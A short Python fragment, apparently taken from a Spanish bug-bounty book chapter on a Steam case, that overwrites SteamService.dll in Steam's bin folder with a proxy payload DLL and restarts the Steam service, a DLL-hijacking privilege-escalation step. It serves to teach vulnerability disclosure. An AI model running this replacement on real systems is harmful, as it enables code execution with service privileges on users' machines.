# Extraído de: LibroBugBounty/cap-21-caso-steam.md
# Reemplazar SteamService.dll en bin\ con proxy
shutil.copy2(payload_dll, os.path.join(STEAM_DIR, "bin",
                                        "SteamService.dll"))
# Reiniciar servicio
subprocess.run(["sc", "start", STEAM_SVC])
